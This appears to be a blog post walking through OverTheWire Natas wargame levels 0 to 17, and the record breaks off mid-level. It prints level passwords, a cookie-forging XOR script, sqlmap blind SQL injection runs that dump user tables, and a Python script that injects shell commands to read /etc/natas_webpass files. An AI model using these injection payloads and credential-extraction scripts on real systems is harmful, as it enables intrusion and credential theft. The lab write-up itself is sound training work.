@@ -1,0 +1,810 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>overthewire-natas-level 1-20 - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="overthewire-natas-level 1-20"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Natas **Natas teaches the basics of serverside web-security. Username: natas0 Password: natas0 URL: http://natas0.natas.labs.overthewire.org By review the source code &amp;lt;html&amp;gt;&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/overthewire-natas-level-1-20/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/overthewire-natas-level-1-20/"},"headline":"overthewire-natas-level 1-20","datePublished":"2025-10-15T05:33+05:30","dateModified":"2026-09-30T18:28+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Natas **Natas teaches the basics of serverside web-security. Username: natas0 Password: natas0 URL: http://natas0.natas.labs.overthewire.org By review the source code &lt;html&gt;&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>overthewire-natas-level 1-20</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-10-15T05:33" class="feed__date">October 15, 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><h1 id="natas">Natas</h1><p>**Natas teaches the basics of serverside web-security.</p><ul><li>Each level of natas consists of its own website located at <a href="http://natasX.natas.labs.overthewire.org">http://natasX.natas.labs.overthewire.org</a>, where X is the level number.    </li><li>There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.      </li><li>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up.     </li><li>All passwords are also stored in /etc/natas_webpass/.</li></ul><p>  </p><h2 id="natas-level-0">Natas Level 0</h2><p>Username:<code>natas0</code>       Password: <code>natas0</code>       URL: <a href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a></p><p><strong>By review the source code</strong></p><pre><code class="language-zsh">&lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas0&quot;, &quot;pass&quot;: &quot;natas0&quot; };&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas0&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+You can find the password for the next level on this page.
+
+&lt;!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq --&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h2 id="natas-level-0-→-level-1">Natas Level 0 → Level 1</h2><p>Username: natas1 URL:      <a href="http://natas1.natas.labs.overthewire.org">http://natas1.natas.labs.overthewire.org</a></p><pre><code class="language-zsh">curl -v http://natas1.natas.labs.overthewire.org/ -u natas1 
+Enter host password for user &#39;natas1&#39;:
+* Host natas1.natas.labs.overthewire.org:80 was resolved.
+* IPv6: (none)
+* IPv4: 56.228.72.241
+*   Trying 56.228.72.241:80...
+* Connected to natas1.natas.labs.overthewire.org (56.228.72.241) port 80
+* Server auth using Basic with user &#39;natas1&#39;
+&gt; GET / HTTP/1.1
+&gt; Host: natas1.natas.labs.overthewire.org
+&gt; Authorization: Basic bmF0YXMxOjBuekNpZ0FxN3QyaUFMeXZVOXhjSGxZT
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sun, 14 Sep 2025 16:13:31 GMT
+&lt; Server: Apache/2.4.58 (Ubuntu)
+&lt; Last-Modified: Fri, 15 Aug 2025 13:06:35 GMT
+&lt; ETag: &quot;427-63c670f40d5c5&quot;
+&lt; Accept-Ranges: bytes
+&lt; Content-Length: 1063
+&lt; Vary: Accept-Encoding
+&lt; Content-Type: text/html
+&lt; 
+&lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas1&quot;, &quot;pass&quot;: &quot;0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq&quot; };&lt;/script&gt;&lt;/head&gt;
+&lt;body oncontextmenu=&quot;javascript:alert(&#39;right clicking has been blocked!&#39;);return false;&quot;&gt;
+&lt;h1&gt;natas1&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+You can find the password for the
+next level on this page, but rightclicking has been blocked!
+
+&lt;!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI --&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h2 id="natas-level-1-→-level-2">Natas Level 1 → Level 2</h2><p>Username: natas2 URL:      <a href="http://natas2.natas.labs.overthewire.org">http://natas2.natas.labs.overthewire.org</a></p><p><a href="http://natas2.natas.labs.overthewire.org/">http://natas2.natas.labs.overthewire.org/</a></p><p></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas2-1.png" alt="natas2-1" data-is-external-image="true"></figure>Source code review<p></p><figure class="post__image"><img src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas2-2.png" alt="natas2-2" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas2-3.png" alt="natas2-3" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas2-4.png" alt="natas2-4" data-is-external-image="true"></figure><pre><code class="language-zsh">
+http://natas2.natas.labs.overthewire.org/files/users.txt
+
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+</code></pre><h2 id="natas-level-2-→-level-3">Natas Level 2 → Level 3</h2><p>Username: natas3 URL:      <a href="http://natas3.natas.labs.overthewire.org">http://natas3.natas.labs.overthewire.org</a></p><figure class="post__image"><img src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas3-1.png" alt="natas3-1" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas3-2.png" alt="natas3-2" data-is-external-image="true"></figure><figure class="post__image"><img src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas3-3.png" alt="natas3-3" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas3-4.png" alt="natas3-4" data-is-external-image="true"></figure><pre><code class="language-zsh">natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+</code></pre><h2 id="natas-level-3-→-level-4">Natas Level 3 → Level 4</h2><p>Username: natas5 URL:      <a href="http://natas4.natas.labs.overthewire.org">http://natas4.natas.labs.overthewire.org</a> <code>**For this level you need burpsuite or zap owasp to modifie the request **</code></p><figure class="post__image"><img src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas4-1.png" alt="natas4-1" data-is-external-image="true"></figure><p></p><p>Catch the Request on Burpsuite and send it to Repecter</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas4-2.png" alt="natas4-2" data-is-external-image="true"></figure><p>By this</p><p><code>Access disallowed. You are visiting from &quot;http://natas4.natas.labs.overthewire.org/&quot; while authorized users should come only from &quot;http://natas5.natas.labs.overthewire.org/&quot;</code> you see it said <code>authorized users should come only from</code> it is like refering some other place like <code>http://natas5.natas.labs.overthewire.org</code> when you see the request it contant the refers header.</p><p></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas4-3.png" alt="natas4-3" data-is-external-image="true"></figure>Boom<p></p><pre><code class="language-zsh">
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+</code></pre><hr><h2 id="natas-level-4-→-level-5">Natas Level 4 → Level 5</h2><p>Username: natas5 URL:      <a href="http://natas5.natas.labs.overthewire.org">http://natas5.natas.labs.overthewire.org</a></p><figure class="post__image"><img src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas5-1.png" alt="natas5-1" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas5-2.png" alt="natas5-2" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/nastas5-3.png" alt="natas5-3" data-is-external-image="true"></figure><pre><code class="language-zsh">Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+</code></pre><hr><h2 id="natas-level-5-→-level-6">Natas Level 5 → Level 6</h2><p>Username: natas6 URL:      <a href="http://natas6.natas.labs.overthewire.org">http://natas6.natas.labs.overthewire.org</a></p><figure class="post__image"><img src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas6-1.png" alt="natas6-1" data-is-external-image="true"></figure><p>The form compares the submitted secret value to the one stored in includes/secret.inc</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas6-2.png" alt="natas6-2" data-is-external-image="true"></figure><p>browse to <code>http://natas6.natas.labs.overthewire.org/includes/secret.inc</code> displayed secret value into the form input to receive the password for Natas7.</p><figure class="post__image"><img src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas6-3.png" alt="natas6-3" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas6-4.png" alt="natas6-4" data-is-external-image="true"></figure><p>Enter that secret in the web form and submit.</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas6-5.png" alt="natas6-5" data-is-external-image="true"></figure><pre><code class="language-zsh">Access granted.          
+The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+</code></pre><h2 id="natas-level-6-→-level-7">Natas Level 6 → Level 7</h2><p>Username: natas7 URL:      <a href="http://natas7.natas.labs.overthewire.org">http://natas7.natas.labs.overthewire.org</a> this is LFI(local file inclusion ) types of Vulnerablitie</p><figure class="post__image"><img loading="lazy" src="https://github.com/h4ck3rfirst/all-Exploit-notes/raw/main/overthewire/files/natas/natas7.gif" alt="natas7 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">natas8 : xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+</code></pre><h2 id="natas-level-7-→-level-8">Natas Level 7 → Level 8</h2><p>Username: natas8 URL:      <a href="http://natas8.natas.labs.overthewire.org">http://natas8.natas.labs.overthewire.org</a></p><figure class="post__image"><img loading="lazy" src="https://github.com/h4ck3rfirst/all-Exploit-notes/raw/main/overthewire/files/natas/natas8.gif" alt="natas8 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
+</code></pre><h2 id="natas-level-8-→-level-9">Natas Level 8 → Level 9</h2><p>Username: natas9 URL :     <a href="http://natas9.natas.labs.overthewire.org">http://natas9.natas.labs.overthewire.org</a></p><figure class="post__image"><img loading="lazy" src="https://github.com/h4ck3rfirst/all-Exploit-notes/raw/main/overthewire/files/natas/natas9.gif" alt="natas9 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">natas10 :  t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+</code></pre><h2 id="natas-level-9-→-level-10">Natas Level 9 → Level 10</h2><p>Username: natas10 URL:      <a href="http://natas10.natas.labs.overthewire.org">http://natas10.natas.labs.overthewire.org</a></p><pre><code class="language-txt">my mistake it found the worng password
+the path of correct password is /etc/netas_webpass/natas11
+you can replace it with /tmp/pass
+the payload
+[a-zA-Z0-9] /etc/natas_webpass/natas11 
+</code></pre><p>Refer’s : <a href="https://stackoverflow.com/questions/76836086/xss-payload-that-can-bypass-special-character-check">bypass of special character</a></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas10.gif" alt="natas10 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">
+/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+</code></pre><h2 id="natas-level-10-→-level-11">Natas Level 10 → Level 11</h2><p>Username: natas11 URL:      <a href="http://natas11.natas.labs.overthewire.org">http://natas11.natas.labs.overthewire.org</a></p><p>In this level i take the help from gpt to understand the code and working machinism And also write the code to solve this level</p><p>This code is trying to brute-force or guess the XOR key by XORing the encrypted cookie with the known structure of the plaintext.</p><p>It assumes that the JSON in the cookie is something like: {“showpassword”:”no”,”bgcolor”:”#ffffff”}</p><pre><code class="language-python">import base64
+
+cipher_b64 = &quot;&quot;
+cipher = base64.b64decode(&quot; &lt;url_decode_cookies_data&gt; &quot;)
+plaintext = b&#39;{&quot;showpassword&quot;:&quot;no&quot;,&quot;bgcolor&quot;:&quot;#ffffff&quot;}&#39;
+
+key_stream = bytes([c ^ p for c, p in zip(cipher, plaintext)])
+print(&quot;Guessed repeating key:&quot;, key_stream[:4])
+</code></pre><p> XOR logic</p><p>XOR (exclusive or) is a reversible operation:</p><p>A XOR B = C</p><p>C XOR B = A → You can get the plaintext back</p><p>C XOR A = B → You can get the key back</p><p>cipher XOR plaintext = key</p><pre><code class="language-python">import json
+import base64
+
+def xor_encrypt(data, key):
+    out = &#39;&#39;
+    for i in range(len(data)):
+        out += chr(ord(data[i]) ^ ord(key[i % len(key)]))
+    return out
+
+new_data = json.dumps({
+    &quot;showpassword&quot;: &quot;yes&quot;,
+    &quot;bgcolor&quot;: &quot;#ffffff&quot;
+})
+
+key = &#39;eDWo&#39;
+
+encrypted = xor_encrypt(new_data, key)
+cookie = base64.b64encode(encrypted.encode()).decode()
+
+print(&quot;New Cookie Value:&quot;, cookie)
+</code></pre><p>the password i got </p><pre><code>The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+</code></pre><h2 id="natas-level-11-→-level-12">Natas Level 11 → Level 12</h2><p>Username: natas12 URL:      <a href="http://natas12.natas.labs.overthewire.org">http://natas12.natas.labs.overthewire.org</a></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas12.gif" alt="natas12 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">natas13 : trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+</code></pre><h2 id="natas-level-12-→-level-13">Natas Level 12 → Level 13</h2><p>Username: natas13 URL:      <a href="http://natas13.natas.labs.overthewire.org">http://natas13.natas.labs.overthewire.org</a></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas13.gif" alt="natas13 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">
+natas14 : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+</code></pre><h2 id="natas-level-13-→-level-14">Natas Level 13 → Level 14</h2><p>Username: natas14 URL:      <a href="http://natas14.natas.labs.overthewire.org">http://natas14.natas.labs.overthewire.org</a></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas14.gif" alt="natas13 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+</code></pre><h2 id="natas-level-14-→-level-15">Natas Level 14 → Level 15</h2><p>Username: natas15 URL:      <a href="http://natas15.natas.labs.overthewire.org">http://natas15.natas.labs.overthewire.org</a></p><p>It take a half hours for sqlijection and dump all the cred </p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/h4ck3rfirst/h4ck3rfirst.github.io/refs/heads/master/assets/img/overthewire/natas/natas15.gif" alt="natas13 demo" data-is-external-image="true"></figure><pre><code class="language-zsh">┌──(kali㉿kali)-[/media/…/ctf/Other/overthewire/natas]
+└─$ sqlmap -r natas  --dump
+        ___
+       __H__                                                                                                                        
+ ___ ___[.]_____ ___ ___  {1.9.9#stable}                                                                                            
+|_ -| . [(]     | .&#39;| . |                                                                                                           
+|___|_  [&quot;]_|_|_|__,|  _|                                                                                                           
+      |_|V...       |_|   https://sqlmap.org                                                                                        
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:54:23 /2025-09-18/
+
+[20:54:23] [INFO] parsing HTTP request from &#39;natas&#39;
+custom injection marker (&#39;*&#39;) found in POST body. Do you want to process it? [Y/n/q] 
+
+[20:54:24] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+[20:54:25] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=&quot; AND (SELECT 7797 FROM (SELECT(SLEEP(5)))QDlB) AND &quot;tPdO&quot;=&quot;tPdO
+---
+[20:54:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL &gt;= 5.0.12
+[20:54:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[20:54:26] [INFO] fetching current database
+[20:54:26] [INFO] resumed: natas15
+[20:54:26] [INFO] fetching tables for database: &#39;natas15&#39;
+[20:54:26] [INFO] fetching number of tables for database &#39;natas15&#39;
+[20:54:26] [INFO] resumed: 1
+[20:54:26] [INFO] resumed: users
+[20:54:26] [INFO] fetching columns for table &#39;users&#39; in database &#39;natas15&#39;
+[20:54:26] [INFO] resumed: 2
+[20:54:26] [INFO] resumed: username
+[20:54:26] [INFO] resumed: password
+[20:54:26] [INFO] fetching entries for table &#39;users&#39; in database &#39;natas15&#39;
+[20:54:26] [INFO] fetching number of entries for table &#39;users&#39; in database &#39;natas15&#39;
+[20:54:26] [INFO] resumed: 4
+[20:54:26] [INFO] resumed: 6P151OntQe
+[20:54:26] [INFO] resumed: bob
+[20:54:26] [INFO] resumed: HLwuGKts2w
+[20:54:26] [INFO] resumed: charlie
+[20:54:26] [INFO] resumed: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+[20:54:26] [INFO] resumed: natas16
+[20:54:26] [INFO] resumed: hROtsfM734
+[20:54:26] [INFO] resumed: alice
+Database: natas15
+Table: users
+[4 entries]
++----------------------------------+----------+
+| password                         | username |
++----------------------------------+----------+
+| 6P151OntQe                       | bob      |
+| HLwuGKts2w                       | charlie  |
+| hPkjKYviLQctEW33QmuXL6eDVfMW4sGo | natas16  |
+| hROtsfM734                       | alice    |
++----------------------------------+----------+
+
+[20:54:26] [INFO] table &#39;natas15.users&#39;
+</code></pre><h2 id="natas-level-15-→-level-16">Natas Level 15 → Level 16</h2><p>Username: natas16 URL:      <a href="http://natas16.natas.labs.overthewire.org">http://natas16.natas.labs.overthewire.org</a></p><p>i try use GPT TO solve this level and understanding the code and what payload should use </p><pre><code class="language-python3">#!/usr/bin/env python3
+import aiohttp
+import asyncio
+import string
+import logging
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
+logger = logging.getLogger(__name__)
+
+# Constants
+URL = &quot;http://natas16.natas.labs.overthewire.org&quot;
+AUTH_USERNAME = &quot;natas16&quot;
+AUTH_PASSWORD = &quot;hPkjKYviLQctEW33QmuXL6eDVfMW4sGo&quot;
+CHARSET = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
+PASSWORD_LENGTH = 32
+CONCURRENT_REQUESTS = 5  # Reduced to avoid server throttling
+MAX_RETRIES = 3  # Retry failed requests up to 3 times
+TIMEOUT = 5  # Timeout per request in seconds
+
+async def check_character(session, password_prefix, char, semaphore, position, retry=0):
+    &quot;&quot;&quot;Check if a character is part of the password asynchronously with retries.&quot;&quot;&quot;
+    async with semaphore:
+        try:
+            needle = f&quot;$(grep -E ^{password_prefix}{char}.* /etc/natas_webpass/natas17)hackers&quot;
+            async with session.get(
+                URL,
+                params={&quot;needle&quot;: needle},
+                timeout=TIMEOUT
+            ) as response:
+                response.raise_for_status()
+                text = await response.text()
+                return char, &#39;hackers&#39; not in text
+        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+            if retry &lt; MAX_RETRIES:
+                logger.warning(f&quot;Retry {retry + 1}/{MAX_RETRIES} for char &#39;{char}&#39; at position {position}: {e}&quot;)
+                await asyncio.sleep(0.5)  # Brief delay before retry
+                return await check_character(session, password_prefix, char, semaphore, position, retry + 1)
+            logger.error(f&quot;Request failed for char &#39;{char}&#39; at position {position} after {MAX_RETRIES} retries: {e}&quot;)
+            return char, False
+
+async def check_position(session, password_prefix, position, semaphore):
+    &quot;&quot;&quot;Test all characters for a given position and return the correct one.&quot;&quot;&quot;
+    tasks = [check_character(session, password_prefix, char, semaphore, position) for char in CHARSET]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    for char, is_correct in results:
+        if isinstance(is_correct, Exception):
+            logger.warning(f&quot;Exception for char &#39;{char}&#39; at position {position}: {is_correct}&quot;)
+            continue
+        if is_correct:
+            logger.info(f&quot;Position {position}: Found character &#39;{char}&#39;, Password so far: {password_prefix + char}&quot;)
+            return char
+    logger.warning(f&quot;No character found at position {position}&quot;)
+    return None
+
+async def test_server(session):
+    &quot;&quot;&quot;Test if the server is reachable.&quot;&quot;&quot;
+    try:
+        async with session.get(URL, timeout=TIMEOUT) as response:
+            response.raise_for_status()
+            logger.info(&quot;Server is reachable.&quot;)
+            return True
+    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+        logger.error(f&quot;Server unreachable: {e}&quot;)
+        return False
+
+async def main():
+    password = []
+    semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)  # Limit concurrent requests
+    
+    logger.info(&quot;Starting password extraction...&quot;)
+    
+    async with aiohttp.ClientSession(auth=aiohttp.BasicAuth(AUTH_USERNAME, AUTH_PASSWORD)) as session:
+        # Test server connectivity
+        if not await test_server(session):
+            logger.error(&quot;Aborting due to server connectivity issues.&quot;)
+            return
+        
+        for position in range(1, PASSWORD_LENGTH + 1):
+            char = await check_position(session, &#39;&#39;.join(password), position, semaphore)
+            if char:
+                password.append(char)
+            else:
+                logger.error(f&quot;Failed to find character at position {position}. Stopping.&quot;)
+                break
+
+    final_password = &#39;&#39;.join(password)
+    if len(final_password) == PASSWORD_LENGTH:
+        logger.info(f&quot;Password extraction complete. Final password: {final_password}&quot;)
+    else:
+        logger.error(f&quot;Incomplete password: {final_password} (Length: {len(final_password)})&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    asyncio.run(main())
+</code></pre><pre><code class="language-zsh">Position 32: Found character &#39;C&#39;, Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+</code></pre><h2 id="natas-level-16-→-level-17">Natas Level 16 → Level 17</h2><p>Username: natas17 URL:      <a href="http://natas17.natas.labs.overthewire.org">http://natas17.natas.labs.overthewire.org</a></p><pre><code class="language-zsh">┌──(kali㉿kali)-[/media/…/ctf/Other/overthewire/natas]
+└─$ sqlmap -r natas17  --dbms=mysql --technique=t --level=5 --risk=3 -dump 
+        ___
+       __H__                                                                                                                                           
+ ___ ___[&#39;]_____ ___ ___  {1.9.9#stable}                                                                                                               
+|_ -| . [,]     | .&#39;| . |                                                                                                                              
+|___|_  [,]_|_|_|__,|  _|                                                                                                                              
+      |_|V...       |_|   https://sqlmap.org                                                                                                           
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:41:26 /2025-09-18/
+
+[23:41:26] [INFO] parsing HTTP request from &#39;natas17&#39;
+[23:41:27] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas17&quot; AND (SELECT 2023 FROM (SELECT(SLEEP(5)))HHFX)-- bfjo
+---
+[23:41:28] [INFO] testing MySQL
+[23:41:28] [INFO] confirming MySQL
+[23:41:28] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
